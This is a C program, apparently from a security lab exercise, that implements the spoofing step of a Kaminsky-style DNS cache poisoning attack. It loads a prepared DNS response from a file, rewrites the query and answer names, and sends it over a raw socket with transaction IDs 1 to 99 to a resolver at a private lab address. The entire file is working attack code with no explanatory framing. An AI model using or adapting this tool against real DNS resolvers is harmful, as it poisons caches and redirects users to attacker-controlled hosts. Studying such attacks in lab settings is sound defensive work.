#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define MAX_FILE_SIZE   2000
#define TARGET_IP "10.0.2.69" 

int send_packet_raw (int sock, char *ip, int n);

int main()
{
  // Create raw socket
  int enable = 1;
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));      

  // Read the DNS packet from file
  FILE *f = fopen("ip.bin", "rb");
  if (!f) {
    perror("Can't open 'ip.bin'");
    exit(0);
  } 
  unsigned char ip[MAX_FILE_SIZE];
  int n = fread(ip, 1, MAX_FILE_SIZE, f);
  printf("Total IP packet size: %d\n", n);

  // Modify the name in the question field (offset=41)
  memcpy(ip+41, "bbbbb" , 5); 
  // Modify the name in the answer field (offset=64)
  memcpy(ip+64, "bbbbb" , 5); 

  for (int id=1; id<100; id++){
     // Modify the transaction ID field (offset=28)
     unsigned short id_net_order;
     id_net_order = htons(id);
     memcpy(ip+28, &id_net_order, 2); 

     // Send the IP packet out
     send_packet_raw(sock, ip, n);
  }

  close(sock);
}

int send_packet_raw(int sock, char *ip, int n)
{
  struct sockaddr_in dest_info;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr.s_addr = inet_addr(TARGET_IP);

  int r = sendto(sock, ip, n, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
  if (r>=0) printf("Sent a packet of size: %d\n", r);
  else printf("Failed to send packet. Did you run it using sudo?\n");
}



